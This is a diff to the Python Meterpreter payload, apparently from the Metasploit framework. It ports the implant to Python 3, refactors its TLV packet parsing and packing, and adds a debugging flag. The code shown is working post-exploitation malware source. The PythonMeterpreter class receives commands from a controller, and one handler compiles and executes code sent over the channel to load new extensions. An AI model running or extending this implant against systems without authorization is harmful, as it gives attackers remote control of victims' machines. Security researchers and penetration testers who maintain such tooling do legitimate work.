@@ -1,12 +1,5 @@
 #!/usr/bin/python
 import code
-try:
-	import ctypes
-except:
-	has_windll = False
-else:
-	has_windll = hasattr(ctypes, 'windll')
-
 import os
 import random
 import select
@@ -15,13 +8,29 @@ import struct
 import subprocess
 import sys
 import threading
+import traceback
+
+try:
+	import ctypes
+except ImportError:
+	has_windll = False
+else:
+	has_windll = hasattr(ctypes, 'windll')
 
 if sys.version_info[0] < 3:
-	bytes = str
+	is_bytes = lambda obj: issubclass(obj.__class__, str)
+	bytes = lambda *args: str(*args[:1])
+	NULL_BYTE = '\x00'
+else:
+	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
+	str = lambda x: __builtins__['str'](x, 'UTF-8')
+	NULL_BYTE = bytes('\x00', 'UTF-8')
 
 #
 # Constants
 #
+DEBUGGING = False
+
 PACKET_TYPE_REQUEST        = 0
 PACKET_TYPE_RESPONSE       = 1
 PACKET_TYPE_PLAIN_REQUEST  = 10
@@ -103,6 +112,7 @@ TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
 TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503
 
 EXPORTED_SYMBOLS = {}
+EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING
 
 def export(symbol):
 	EXPORTED_SYMBOLS[symbol.__name__] = symbol
@@ -129,25 +139,6 @@ def inet_pton(family, address):
 	raise Exception('no suitable inet_pton functionality is available')
 
 @export
-def packet_get_tlv(pkt, tlv_type):
-	offset = 0
-	while (offset < len(pkt)):
-		tlv = struct.unpack('>II', pkt[offset:offset+8])
-		if (tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type:
-			val = pkt[offset+8:(offset+8+(tlv[0] - 8))]
-			if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
-				val = val.split('\x00', 1)[0]
-			elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
-				val = struct.unpack('>I', val)[0]
-			elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
-				val = bool(struct.unpack('b', val)[0])
-			elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
-				pass
-			return {'type':tlv[1], 'length':tlv[0], 'value':val}
-		offset += tlv[0]
-	return {}
-
-@export
 def packet_enum_tlvs(pkt, tlv_type = None):
 	offset = 0
 	while (offset < len(pkt)):
@@ -155,7 +146,7 @@ def packet_enum_tlvs(pkt, tlv_type = None):
 		if (tlv_type == None) or ((tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type):
 			val = pkt[offset+8:(offset+8+(tlv[0] - 8))]
 			if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
-				val = val.split('\x00', 1)[0]
+				val = val.split(NULL_BYTE, 1)[0]
 			elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
 				val = struct.unpack('>I', val)[0]
 			elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
@@ -167,24 +158,36 @@ def packet_enum_tlvs(pkt, tlv_type = None):
 	raise StopIteration()
 
 @export
+def packet_get_tlv(pkt, tlv_type):
+	try:
+		tlv = list(packet_enum_tlvs(pkt, tlv_type))[0]
+	except IndexError:
+		return {}
+	return tlv
+
+@export
 def tlv_pack(*args):
 	if len(args) == 2:
 		tlv = {'type':args[0], 'value':args[1]}
 	else:
 		tlv = args[0]
 	data = ""
-	if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
-		data = struct.pack('>II', 8 + len(tlv['value']) + 1, tlv['type']) + tlv['value'] + '\x00'
-	elif (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
+	if (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
 		data = struct.pack('>III', 12, tlv['type'], tlv['value'])
 	elif (tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
-		data = struct.pack('>II', 9, tlv['type']) + chr(int(bool(tlv['value'])))
-	elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
-		data = struct.pack('>II', 8 + len(tlv['value']), tlv['type']) + tlv['value']
-	elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
-		data = struct.pack('>II', 8 + len(tlv['value']), tlv['type']) + tlv['value']
-	elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
-		data = struct.pack('>II', 8 + len(tlv['value']), tlv['type']) + tlv['value']
+		data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(tlv['value']))), 'UTF-8')
+	else:
+		value = tlv['value']
+		if not is_bytes(value):
+			value = bytes(value, 'UTF-8')
+		if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
+			data = struct.pack('>II', 8 + len(value) + 1, tlv['type']) + value + NULL_BYTE
+		elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
+			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
+		elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
+			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
+		elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
+			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
 	return data
 
 #@export
@@ -254,7 +257,7 @@ class PythonMeterpreter(object):
 		self.channels = {}
 		self.interact_channels = []
 		self.processes = {}
-		for func in filter(lambda x: x.startswith('_core'), dir(self)):
+		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
 			self.extension_functions[func[1:]] = getattr(self, func)
 		self.running = True
 
@@ -360,13 +363,13 @@ class PythonMeterpreter(object):
 		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
 		if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
 			return ERROR_FAILURE
-		preloadlib_methods = self.extension_functions.keys()
+		preloadlib_methods = list(self.extension_functions.keys())
 		symbols_for_extensions = {'meterpreter':self}
 		symbols_for_extensions.update(EXPORTED_SYMBOLS)
 		i = code.InteractiveInterpreter(symbols_for_extensions)
 		i.runcode(compile(data_tlv['value'], '', 'exec'))
-		postloadlib_methods = self.extension_functions.keys()
-		new_methods = filter(lambda x: x not in preloadlib_methods, postloadlib_methods)
+		postloadlib_methods = list(self.extension_functions.keys())
+		new_methods = list(filter(lambda x: x not in preloadlib_methods, postloadlib_methods))
 		for method in new_methods:
 			response += tlv_pack(TLV_TYPE_METHOD, method)
 		return ERROR_SUCCESS, response
@@ -484,17 +487,22 @@ class PythonMeterpreter(object):
 		reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
 		resp += tlv_pack(reqid_tlv)
 
-		handler_name = method_tlv['value']
+		handler_name = str(method_tlv['value'])
 		if handler_name in self.extension_functions:
 			handler = self.extension_functions[handler_name]
 			try:
-				#print("[*] running method {0}".format(handler_name))
+				if DEBUGGING:
+					print("[*] running method {0}".format(handler_name))
 				result, resp = handler(request, resp)
 			except Exception:
-				#print("[-] method {0} resulted in an error".format(handler_name))
+				if DEBUGGING:
+					print("[-] method {0} resulted in an error".format(handler_name))
+					exc_type, exc_value, exc_traceback = sys.exc_info()
+					traceback.print_exception(exc_type, exc_value, exc_traceback, file=sys.stderr)
 				result = ERROR_FAILURE
 		else:
-			#print("[-] method {0} was requested but does not exist".format(handler_name))
+			if DEBUGGING:
+				print("[-] method {0} was requested but does not exist".format(handler_name))
 			result = ERROR_FAILURE
 		resp += tlv_pack(TLV_TYPE_RESULT, result)
 		resp = struct.pack('>I', len(resp) + 4) + resp
